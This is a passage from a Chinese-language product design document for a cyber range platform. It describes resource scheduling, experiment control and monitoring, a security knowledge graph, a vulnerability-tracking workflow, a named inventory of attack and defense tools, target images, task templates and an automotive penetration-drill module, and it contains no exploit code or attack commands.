反馈。</p><p>测评资源调度包含如下图功能部分：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/dbd3082c1a2d38efe1c843083bcb10ef.png"></p><p>测评资源调度功能结构图</p><p>配置解析功能起着桥梁的作用，将由配置管理界面生成的配置文件进行详尽解析，以此来确定需要构建的测试环境针对基础虚拟网络、虚拟节点以及虚实连接所必需的资源规模。配置管理界面的工具利用这些配置接口，直接将系统中环境变更的需求转换成具体的任务，并依次将这些任务排入任务队列中待处理。</p><p>为了评估测试环境所需的虚拟资源，系统提供一系列算法。这些算法能够计算出虚拟网络和节点所需的资源量，比如网络资源数、CPU资源数、内存及存储资源数。这种评估将考虑到当前系统中可使用的空闲虚拟资源，并据此判断系统是否有能力支持构建预定的测试环境。</p><p>任务管理部分则是将环境的需求转化为实际的配置任务，这些任务会根据它们之间的依赖关系进行排序，并添加到任务队列中。此外，它还负责维护和控制这些任务间的依赖关系。</p><p>异常处理部分致力于监控任务的执行状态，对于超时未完成或发生故障的任务提供相应的处理机制。确保系统的鲁棒性和可靠性。</p><p>任务结果管理模块充当消息总线的回调机制，根据底层系统返回的任务执行情况，处理和反馈结果信息。通过这些模块的协同工作，系统确保了任务的顺利执行和及时准确的状态反馈，为用户管理和维护测试环境提供了强有力的支持。</p><p>1）配置解析功能</p><p>配置解析模块的主要作用是对由配置管理界面所生成的配置文件进行详细的解码工作，这将揭示所需生成的网络环境的拓扑结构。该模块负责分析拓扑结构和其参数设置，从而得出构成该拓扑所需的子网分割、节点定义和连接关系。</p><p>配置文件本身采用了标准的XML格式，系统内部定义了该格式以描述网络环境的特定方面。当配置文件被传递至系统时，一个专用的XML解析器被调用以提取出配置文件中定义的网络组件信息，如虚拟和实体的子网、它们的互联关系，以及其他关键配置详情。</p><p>更具体地，XML解析器能够逐项读取配置文件中规定的虚拟子网设置、虚拟子网间的连线关系、实体子网的特征和它们的连接方式、虚拟和实体网络的交互连接方式，另外还包括数据采集和监控设置以及软件部署指令。此外，每个虚拟子网需部署的虚拟节点数量和属性，以及诸如协议栈节点之类的详细要求也会被解析并准备好以供后续的配置部署。</p><p>系统设计这种解析流程是为了确保网络环境的准确构建，同时提供所需网络模拟详尽的参数化配置，从而使网络管理员或者研究人员能够定制和部署复杂的网络测试环境。这种方法的实施保障了网络环境创建的透明度和重现性，满足不同用户对于网络配置的精细化管理需求。</p><p>2）资源评估功能</p><p>(1)虚拟资源评估</p><p>虚拟资源评估功能负责分析和确定系统是否具备构建配置文件所描述的目标网络环境所需的全部资源。这一过程涉及到多种虚拟资源的核算，包括网络资源如VLAN和公共IP地址，以及计算资源包括CPU、内存和硬盘空间。</p><p>评估操作涵盖对每个虚拟节点所需计算资源的总量—如CPU时钟频率、内存容量和存储空间—进行仔细估算，并对网络部分，如VLAN数量和公共IP地址的使用，进行准确盘点。这一连串计算行动的目的在于确保系统在资源分配上能够满足测试床网络环境构建的所有需求。</p><p>整个评估流程是为确保在实际配置之前，所需的每一项资源都得以妥善准备和规划，从而避免在构建或运行时发生资源短缺，保障实验环境的稳定运行和测试的准确性。通过对虚拟资源的精细评估，管理员能够对资源使用进行优化，确保测试网络环境的高效配置与运行。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/586cf3637013d4d00ddd796817479a9c.png"></p><p>虚拟资源</p><p>虚拟资源评估的方法是：</p><p>进行虚拟资源的评估时，首先需在每个子网内部进行资源占用的统计。这包括累加每台虚拟机所使用的CPU核心数、内存大小以及硬盘存储量。这样做可以得到整个子网所需要的资源总量。</p><p>系统将对所有子网进行同样的计算，将各个子网所需的CPU、内存和硬盘资源进行汇总，从而得出构建整个环境所需要的总资源量。这个总量是决定系统能否支持设定环境的关键因素。</p><p>同时，系统还需统计所有子网占用的外部IP地址数量，以及子网的总数，这些信息用来计算整个网络环境所需要的外部网络接口数量和VLAN资源。这一系列的累计和统计活动，旨在为了确保环境的资源需求量不会超出系统的承载能力，从而可以顺利地构建和运行预定的虚拟网络环境。</p><p>(2)实物资源评估</p><p>资源评估在构建和管理虚拟网络环境时扮演着至关重要的角色，它可以手动执行，也可以通过自动化算法完成。</p><p>在手动评估过程中，管理员利用配置管理服务模块的用户界面来指定资源的预分配。通过这一界面，管理员可以根据网络环境的需求和可用资源的具体情况，有选择性地为各个组件指派资源。这种方法依赖于管理员对当前系统状态和工作负载要求的深入了解。完成资源的分配后，系统会生成一个包含所有资源分配详情的配置文件，然后发送到虚拟网络的相应子系统，以便进一步处理和实施。</p><p>对于自动完成的资源评估，则是基于既定的负载均衡算法来进行。这些算法考虑到网络内的资源使用效率和平衡性，可以自动计算资源分配方案。自动评估方法旨在最小化人工操作，减少配置错误，优化资源利用，并保证服务质量。自动化系统会根据算法提供的结果自动配置网络环境，减轻管理员的工作负担。</p><p>无论是手动还是自动资源评估，目的都是保证虚拟网络环境能够充分利用系统资源，同时满足测试和运营的需求。</p><h6 id="测评流程编排导调"><a href="#测评流程编排导调" class="headerlink" title="测评流程编排导调"></a>测评流程编排导调</h6><h6 id="测评试验并行管理"><a href="#测评试验并行管理" class="headerlink" title="测评试验并行管理"></a>测评试验并行管理</h6><p>系统能并行支撑多个工程，即多个目标网络环境的模拟，目标网络环境之间是通过三层路由实现安全隔离的，如果试验环境之间需要通信可以通过访问控制策略配置来实现，该系统至少可以同时支撑多个以上的网络环境的部署和运行。并支持多个人员同时对同一个工程进行编辑与管理。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/c945f9197cc00250e7d220140f0ebb40.png"></p><p>试验人员管理</p><p>在系统中，将对编辑的人员进行授权，纳入到工程中，用户就可以分别用自己的账号进行编辑与管理。</p><h6 id="测评试验运行管理"><a href="#测评试验运行管理" class="headerlink" title="测评试验运行管理"></a>测评试验运行管理</h6><p>试验运行管控主要对试验过程控制，、包括试验环境构建过程管理、试验运行进程控制，可根据试验任务配置方案启动相关试验环绕的构建过程，支持控制试验的开始、暂停、继续、回滚、回放、停止、科目更换和资源回收等。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/3eaba8d0e2c258594e87ed3376cb22e0.png"></p><p>试验开始、停止控制</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/1561c919000a75125aeb8bca2968a261.png"></p><p>试验暂停控制</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/70991c1e123e07695d51b6c8c3203968.png"></p><p>试验回放控制</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/67d7cd1ee8a138cdc652f43d34b6f52d.png"></p><p>科目更换控制</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/78ba68e57e89cd43da70107d8770a1e3.png"></p><p>试验回滚</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/34d223d6761c6ac24596e1369c991487.png"></p><p>试验运行控制</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/cf5ad201fd04d4919988ee195d2442af.png"></p><p>试验资源回收控制、试验数据保存、试验查询</p><p>系统支持对试验过程的数据进行存储，并可根据存储的数据进行回滚。</p><h6 id="测评试验过程监控"><a href="#测评试验过程监控" class="headerlink" title="测评试验过程监控"></a>测评试验过程监控</h6><p>提供试验过程的可视化监控功能，一方面可通过实时的采集实物和虚拟节点状态信息，经过分析处理，得到虚拟机的内存利用率、 CPU利用率、硬盘利用率、网卡流量和进程信息等，经过与配置的阈值比较，产生告警信息，并在界面显示。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/6a0685abfa6d50f1347bbccafb77ba04.png"></p><p>试验过程告警监控</p><p>另一方面对在测试过程中，实时采集数据、过滤数据并分析评估转换成图形的信息展示，系统支持将测试任务分解成多级的子任务，并支持任务进度的管理，支持任务状态的展示。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/9f2cc3cb314c0da73303acf3f41ceeeb.png"></p><p>试验过程告警监控</p><p>另一方面对在测试过程中，实时采集数据、过滤数据并分析评估转换成图形的信息展示，系统支持将测试任务分解成多级的子任务，并支持任务进度的管理，支持任务状态的展示。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/4176393f7ba78dcf0b372830c0116a7d.png"></p><p>试验任务状态监控</p><p>支持对试验中的操作日志进行监控以及异常信息告警。具备试验日志记录功能，支持试验日志按用户、用户类型、时间的条件进行查询。</p><p><strong><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/a265177ce041e3dc028323b1ee19dcc0.png"></strong></p><p>日志监控与告警</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/ccb02c9c1cad75fa56f7542cf2ad82c3.png"></p><p>节点录屏</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/bbbeb4bd411ef93edadbaf6033d119ed.png"></p><p>录屏播放</p><p>虚拟节点数据采集采用基于libvmi和libvirt的采集方式，从运行虚拟机的宿主机上，获取虚拟机的运行状态信息包括CPU利用率、内存利用率、硬盘利用率、磁盘IO、网络流量、TCP连接信息、UDP连接信息等信息。支持虚拟机节点自动发现崩溃、无响应等状态。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/54c36337cb482627b1367e1ffadb404b.png"></p><p>虚拟机运行状态监控</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/55efd983eea4902560df7c77d96b781d.png" alt="C:\\Users\\Administrator\\Documents\\Tencent Files\\275129700\\Image\\C2C\\Image1\\@XH_Q%ZO\`3}6B0FH\`Z)4T14.png"></p><p>虚拟机事件监控</p><p>系统支持虚拟机从崩溃中自动恢复到初始状态或手动选择崩溃节点的处理方式，处理方式包括查看虚拟节点状态、重启、重置等操作。支持虚拟节点状态保存和恢复，并提供配置接口，每个虚拟机支持保存2个状态。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/8c22a3f95448bb3f022f316a4cbb116d.png"></p><p>虚拟机状态控制与恢复</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/86cd3950456b5d49efbf2a0a4dabe50a.png"></p><p>虚拟机宏观概况</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/9f17d7465a3055e2914360d5708ebafc.png"></p><p>虚拟机流量监控</p><h6 id="测评试验攻防事件"><a href="#测评试验攻防事件" class="headerlink" title="测评试验攻防事件"></a>测评试验攻防事件</h6><p>为了使系统更具灵活性，需要对一些影响系统运行的值，做出可变化的设置，以便系统的扩展。系统参数配置管理提供系统的全局配置功能，包括字典的配置、初始化或运行期系统参数的配置以及一些专用配置，譬如态势事件定义配置等。系统支持试验事件管理，对试验事件的关联分析并形成事件关联列表，支持关联事件查询统计，可根据事件类型、来源、发生时间、严重程度等对事件关联列表进行过滤查询。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/8db8b60792e024cd11ba10cee9dcd7ac.png"></p><p>系统事件配置</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/4de3e3c5ca841fbe253954c59e77f9b9.png"></p><p>事件参数配置</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/be0fb5bb3fe642735fb87167518503e6.jpeg"></p><p>试验事件展示</p><h6 id="测评试验回放"><a href="#测评试验回放" class="headerlink" title="测评试验回放"></a>测评试验回放</h6><p>系统通过试验态势数据展示模块为试验过程中的攻防态势提供可视化服务，通过定义规则，系统从将从宿主机、网络流量采集的数据，经过流处理规则的过滤，在过滤出特定的数据时，产生一个事件，该事件驱动与事件相关联的任务，完成对数据的进一步的基于配置规则的分析处理，从而得到需要展示的态势数据，进而界面程序又将台式数据转换为效果展示的数据，在屏幕上展示，以此实现支持以数据驱动事件、事件驱动任务、任务驱动态势、态势驱动效果展示的模式来展示整个试验的态势。包括对试验任务数据的解析、试验任务状态的跟踪、任务事件的驱动和最终的可视化2D/3D展示功能。系统提供台式数据存储服务，并支持使用存储的态势数据进行回放。回放能够根据试验过程中所记录的参试设备配置数据、状态数据、外测数据、综合态势信息等各类作战数据及其时间属性，通过对数据的按时序回放展现整个试验过程，并对回放的进程进行控制。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/4cc2248ba5b76d885cdf6ac5d15485de.png"></p><p>录屏回放</p><h4 id="安全攻防资源管理子模块"><a href="#安全攻防资源管理子模块" class="headerlink" title="安全攻防资源管理子模块"></a>安全攻防资源管理子模块</h4><h5 id="知识库管理"><a href="#知识库管理" class="headerlink" title="知识库管理"></a>知识库管理</h5><p>网络安全知识库具有以下功能:</p><p>支持对安全知识的查询检索,用户可以输入相关关键词进行查询。</p><p>知识支持分类组织和关系关联,用户可以快速定位需要的知识。</p><p>知识库内容包括各类网络安全实体间的复杂关系,如时序、空间、数量、依赖等关系。</p><p>知识可视化呈现,通过图谱直观展示实体之间的逻辑关联。</p><p>支持知识的导入更新,管理员可以新增编辑知识图谱内容。</p><p>知识抽取自多源安全数据,并利用AI算法不断学习丰富知识图谱。</p><p>知识库为安全态势评估、威胁检测等提供知识支持。</p><p>通过知识关联分析,可以计算出网络环境的安全态势。</p><p>网络安全知识库构建流程</p><p>安全知识的抽取主要对国家安全部门和安全企业的安全公告、安全论坛、安全漏洞库、安全书籍、专家报告、安全工作者社交媒体等信息，采用网络爬虫和自然语言处理技术，基于安全本体，抽取安全实体及其关系，从而构建安全知识图谱。</p><p>安全知识图谱推理是根据安全本体，自动推理生成安全知识图谱中实体间新的关系，合并消解安全实体。安全知识图谱自学习是通过安全事件，基于“假设-验证”推理理论，进行安全知识图谱自学习。安全模式挖掘是离线对安全事件数据集进行频繁模式、序列模式，获得新的安全知识，既而丰富安全知识图谱。安全模式深度学习是离线对安全事件数据集进行深度学习训练，掌握安全模式，从而根据未知安全事件数据集，形成安全知识，丰富安全知识图谱。</p><h5 id="漏洞闭环管理"><a href="#漏洞闭环管理" class="headerlink" title="漏洞闭环管理"></a>漏洞闭环管理</h5><p>漏洞闭环管理是本平台主要的业务功能之一，其管理流程根据登录系统用户的不 同而有所不同。此处将与漏洞闭环管理相关的三种用户(测试人员、开发负责人和开 发人员)分别进行漏洞业务流程的概述。</p><p>测试人员管理漏洞:测试人员进入登录界面，输入验证信息，若验证信息正确则进入相应权限页 面；若验证信息错误，则系统给出提示，需重新输入。测试人员进入系统界面后， 选择漏洞闭环管理模块中的新增漏洞子模块，对漏洞进行详细记录并指派给开发负责 人，经开发负责人确认为漏洞的返回“修改中”漏洞状态，认为不是漏洞的返回 “已拒绝”漏洞状态，测试人员确认拒绝原因后认为不是漏洞的，则修改漏洞状 态为“已确认”并关闭漏洞。开发人员将已修改的漏洞提交给测试人员，测试人 员进行验证，若验证无误后则修改漏洞状态为“已确认”并关闭漏洞，漬验证后 发现仍存在漏洞则重将漏洞提交给开发负责人，循环前面的操作。</p><p>开发负责人管理漏洞:开发负责人进入登录界面，输入验证信息，若验证信息正确则进入相应权限 页面；若验证信息错误，则系统给出提示，需重新输入。开发责任人进入系统界 面后，选择漏洞闭环管理模块的修改漏洞状态子模块，对“新建”状态的漏洞进行验 证，若确定是漏洞的则修改漏洞状态为“修改中”并将漏洞分配给相应的开发人 员，若不认为是漏洞的则修改漏洞状态为“已拒绝”并填写拒绝原因。开发负责 人对开发人员已修改的漏洞进行验证(状态为“待验证”)，若确认漏洞已修改则 将漏洞状态修改为“待确认”并提交给测试人员，若认为漏洞未修改好则将漏洞 再分配给开发人员，且此时漏洞状态为“修改中”。</p><p>开发人员管理漏洞:开发人员进入登录界面，输入验证信息，若验证信息正确则进入相应权限页 面；若验证信息错误，则系统给出提示，需重新输入。开发人员进入系统界面后， 选择漏洞闭环管理模块的漏洞分配子模块，明确被分配的漏洞后，再对漏洞进行修改。 若漏洞修改好了则将漏洞状态改为“待验证”并提交给开发负责人。开发负责人 若认为漏洞已修改则修改漏洞状态为“待确认”，若认为修改未修改好则将漏洞 状态修改为“修改中”并将漏洞重新分配给开发人员。</p><p>漏洞闭环管理模块根据不同的用户角色，显示的功能不同，但是它们的基本流程 原理相似。现以测试人员新增漏洞功能为例进行处理流程的概述。新增漏洞的业务流程图如图所示：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/a3d87a604cb28ee60b9c690151d55ce5.png"></p><p>：新增漏洞管理流程图</p><p>(1)测试人员发现有未通过测试的用例，点击旁边的“创建漏洞”链接， 触发一个 faultAddBefore.action 请求；</p><p>(2)faultAddBefore.action 请求被 struts.xml 文件拦截并选择 faultAddBeforeAction.java 类处理请求；</p><p>(3)faultAddBeforeAction.java类获取所有已存在的漏洞信息，在这个过程 中 applicationContext.xml 文件实例化 faultAddService 和 faultAddDao,然后将获 取的结果返回给struts.xml ,若果返回的是success结果，则跳转到</p><p>faultAddContext.jsp页面(新增漏洞对话框页面)；</p><p>(4)测试人员输入漏洞信息，点击确定；</p><p>(5)提交信息的post方法触发faultAdd.action请求；</p><p>(6)faultAdd.action 请求被 struts.xml 文件拦截并选择 faultAddAction.java 类 处理请求；</p><p>(7)faultAddAction.java 将 faultAddContext.jsp 页面提交的漏洞信息进行处 理并添加在数据库中，且将返回结果(SUCCESS或INPUT)传送给struts.xml,让 其选择相应的返回页面，若返回的是“SUCCESS”则跳转到用户管理页面</p><p>(userManager.jsp),若返回的是”INPUT”(漏洞ID已存在)则跳转到新增漏洞 对话框页面(faultAddContext.jsp)；</p><p>(8)新增操作执行后，向LogRecord类发出调用refresh()方法的消息进行 日志的记录操作。</p><p>漏洞闭环管理是对漏洞进行新增、修改状态和关闭操作。具有漏洞相关操作的用 户有测试高级工程师、测试人员、开发负责人和开发人员。测试高级工程师可关 闭“已确认”状态的漏洞，测试人员对漏洞有新增、修改状态和关闭操作权限， 开发负责人和开发人员对漏洞有修改状态操作权限。现以测试新增漏洞和修改缺 陷状态为例进行详细叙述。新增漏洞対话框如下图所示：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/aaf77234bf2a4699539717215a1b447e.jpeg"></p><p>：新增漏洞对话框</p><p>新增对话框中包含以下字段：漏洞ID、漏洞名称、所属模 块，漏洞复现步骤、指派责任人、测试人员、漏洞状态和备注。其中，漏洞ID 是唯一性标识，不可重复,•漏洞名称、所属模块、漏洞复现步骤、指派责任人、 测试人员和漏洞状态是必填项。新增漏洞时，漏洞状态默认为“新建”；点击指 派责任人输入框时出现下拉菜单，下拉菜单内为相关人员名称；当输入已存在的 漏洞ID时，系统需给出“需求ID已存在，请重新输入”的提示；当点击保存时, 若必填字段处为空，则系统给出“请输入必填信息”提示。</p><p>三个用户对修改漏洞状态时的权限有些不同，现以开发人员修改漏洞为例进 行详细叙述。点击一条漏洞记录的修改标识，进入修改漏洞状态的表单，此时的 漏洞ID、漏洞名称、所属模块、漏洞复现步骤为不可编辑状态；点击漏洞状态输 入框，出现下拉菜单，下拉菜单内容为“已拒绝”、“修改中”、“待验证”、“待确 认”和“已确认”，且当漏洞状态被修改为“待验证”（即代表开发人员己修改缺 陷并提交给开发负责人）时，修改漏洞状态表单会比新增漏洞表单多一个“解决 时间”字段且为可编辑状态，而被修改成其它状态时，只显示解决时间字段，但 为不可编辑状态。修改漏洞状态表单如下图所示：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/ec0eae76d0df44aea806619e26e0972a.jpeg"></p><p>：修改漏洞状态对话框</p><h5 id="测试工具管理"><a href="#测试工具管理" class="headerlink" title="测试工具管理"></a>测试工具管理</h5><p>攻防工具库包括常用的攻击软件以及防御软件，具体类型可分为信息搜索、数据纂改与欺骗、拒绝服务攻击、漏洞利用、恶意代码、web攻击、无线网络攻击、网络设备攻击、逆向工具、系统防御等类型。数量在161个，此外还包含有攻击工具或防御工具的主机，如常见Linux系统攻击主机（至少含kali、backtrack、backbox，window的Metasploit等。安防软件包括Bit Defender、趋势、卡巴斯基、诺顿、ESET Nod32、小红伞、MSE、McAfee等防病毒软件1套，Nessus、NeXpose、OpenVAS等漏洞扫描软件1套，Lynis等安全审计软件1套，Nagios、Munin、Pingdom、Graphite、Ganglia、IBM Tivoli NETCOOL等安全监控软件1套，以及反垃圾邮件、应用层防火墙等其他类安防软件。详情如下图所示。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/0fd71d608fed04534dee0a358b718cf7.png"></p><p>：测试工具管理</p><h5 id="测试靶标管理"><a href="#测试靶标管理" class="headerlink" title="测试靶标管理"></a>测试靶标管理</h5><p>提供对试验的虚拟资源进行统一管理。包括虚拟机镜像、Docker镜像、虚拟试验环境、虚拟机节点、Docker容器节点、虚拟链路、安全组、IPs、VLANs等资源的统一调度和管理。主要操作包括：增加、删除、修改、查询和监控。基础虚拟资源中可以定义各种操作系统的镜像，包括Window,Linux等。镜像支持设置虚拟仿真设备的型号、登录用户、登录口令、操作系统及应用软件等。支持对镜像设置密码，当基于镜像生成实例时，能以用户设置的用户名、口令等登录到虚拟机。其他参数可通过配置元数据或者文件的方式进行配置。镜像包括类型台式机、笔记本、服务器、手持终端、路由器、交换机、防火墙、IDS等多种网络节点的镜像，路由器镜像包括有Cisco品牌、Juniper品牌，主机镜像包括Centos、Ubuntu、Debian、Redhat、Kali、Fedora，windows包括Windows XP、Windows 7、Windows Server 2003、Windows Server 2008等32位，64位等20种各种发型版本。</p><p><strong><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/f2afe1022c956a90a14882d2102dea86.png"></strong></p><p>虚拟靶标管理</p><h5 id="任务模板管理"><a href="#任务模板管理" class="headerlink" title="任务模板管理"></a>任务模板管理</h5><p>任务模板管理是网络靶场中的重要功能，它允许用户将现有的任务配置信息保存为模板，这些模板可以带有描述性信息，还可以与其他用户共享，以及进行导出和导入。类似地，场景模板管理、流程模板管理和评估策略模板管理也都具备类似的功能。这些功能的核心目的是为了提高效率和一致性，允许用户在不同的网络环境中重复使用和共享特定的配置。</p><p>任务模板管理的关键功能包括：</p><p>保存任务配置为模板：用户可以将当前的任务配置保存为模板，这意味着他们可以在将来的任务中重新使用这个配置，无需从头开始。</p><p>模板描述：每个模板可以带有描述信息，以帮助用户更好地理解模板的用途和内容。</p><p>共享模板：用户可以选择共享他们创建的任务模板，这对于团队协作和知识共享非常有用。</p><p>导入和导出模板数据：这使用户能够轻松地在不同的系统之间共享和转移模板。</p><p>模板数量管理：系统支持大量模板，确保用户可以管理和组织大量的任务、场景、流程和策略模板。</p><p>任务模板管理的核心优势在于提供了一种标准化的方法来配置和管理网络环境，减少了用户的工作量，提高了工作效率，同时也降低了配置错误的风险。这对于网络靶场的操作和管理至关重要，特别是在需要频繁创建不同网络环境的情况下。通过模板管理，用户可以更轻松地构建、部署和管理网络任务，从而更好地满足各种需求。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/b20881a5cd2e4fff4034ee5bca946272.png"></p><p>任务模板管理内部服务</p><p>任务模板管理对模板进行定义时可以通过获取配置文件经由文件分类管理服务进行分类识别，然后经配置文件持久化服务保存至任务模板库，同时在需要任务模板时可以通过配置文件访问服务从模板库中获取模板数据生成相应模板文件。任务模板支持自动化配置，配置内容包括：虚拟网络节点的IP地址、MAC地址等属性，网络配置，方便用户基于模板来配置。其核心实现过程如下：</p><p>配置管理服务最终生成的统一配置文件，如果需要被定义成模板，则发送给任务模板管理模块，经模块中的配置文件分类服务进行过滤，然后按照不同类别的目标网络进行分类，标记为模板。</p><p>被标记为模板的配置文件经配置文件持久化服务处理后，变成可被保存到关系型数据库格式的数据。与此同时，数据也被持久化到相应库中。</p><p>被保存为任务模板的网络拓扑，在用户发出请求后，经配置管理界面模块和服务模块，下发获取请求，至该模块的配置文件访问服务。</p><p>配置文件访问服务从任务模板库中读取指定的模板数据，然后组装生成一份配置文件，发送给配置文件分类管理服务。</p><p>配置文件分类管理服务收到来自访问服务生成的配置文件后，依照其标识进行分类，返回给配置管理服务模块，供配置管理界面模块展示。</p><p>任务模板支持二次设计，将单独的网络设备编辑好属性，并保存。在新的网络拓扑设计时，如果要用到以前保存好的网络设备，可在左侧的设备窗口中将选中某个设置好属性的设备，组成网络。并支持对任务模板的增删改查的管理。全虚拟化路由器支持自动化配置，使网络管理更加高效。它能够进行动态路由配置，自动更新路由表来适应网络变化。同时，管理员可以设置静态路由的优先级，确保关键流量的优先传输。还可以配置包过滤规则，控制流经路由器的数据包。拥塞控制功能也可以配置，以管理网络在高流量时的表现。为简化这一过程，目标网络的配置数据提供了易于使用的设计界面接口，允许用户利用模板快速配置网络设置。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/38ca4e1c7cd803ed3a7a5d67508182f6.png"></p><p>任务模板管理</p><p>在新建任务模板时，从已有的任务模板选择导入，并重新命名即可，如图所示：</p><p>![C:\Users\Administrator\Documents\Tencent Files\275129700\Image\C2C\Image1\]47T39SP(_G}K<a href="https://focu5.oss-cn-beijing.aliyuncs.com/media/ee2fd47542d3864428434e2b0824715c.png">6GZQ3HEVC.png</a></p><p>任务模板配置</p><p>网络拓扑可灵活重构虚拟网络的拓扑结构，无论是二层试验网、三层子网还是包括各类集群的混合型复杂网络都可以自由的重构，与底层物理网络拓扑无关。</p><p>模板中支持试验设备参数的批量配置，配置内容包括操作系统安装分布、安全防御配置分布、网络服务分布、客户端分布等。</p><h2 id="汽车安全演练模块"><a href="#汽车安全演练模块" class="headerlink" title="汽车安全演练模块"></a>汽车安全演练模块</h2><ul><li>渗透演练支持演练人员顺序闯关与随机闯关两种模式，顺序闯关模式支持演练人员按照渗透训练场景任务顺序完成任务，并实时展示下一个任务，提供产品功能截图证明；</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/2fa1e3d7ba2fa8305fcbe9b209a04481.png"></p><ul><li>支持设计师对演练的开始、停止的控制，在开始后，演练人员能够接入到演练环境中进行综合演练，提供产品功能截图证明；</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/d3abf8ec20eeea4f40bbec68d3c70a54.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/e35ea9453a1fcf550c041c4a7172ff76.png"></p><ul><li>支持演练相关要素的一键配置，支持展示一键配置的进度以及结果。能够根据选择的靶标和演练队伍自动进行环境的分配，提供产品功能截图证明；</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/ef5d62487818d2e4075d77374f5dbcf9.png"><br><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/0b7b261a9bb6c95ef5387f5ce5fa814e.png"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/171199d5811a136153a4d4f3c6b197e8.png"></p><ul><li>支持演练人员提交成果验证状态的实时查看，支持设计师对各队伍、各任务完成进度与状态的查看，提供产品功能截图证明；</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" 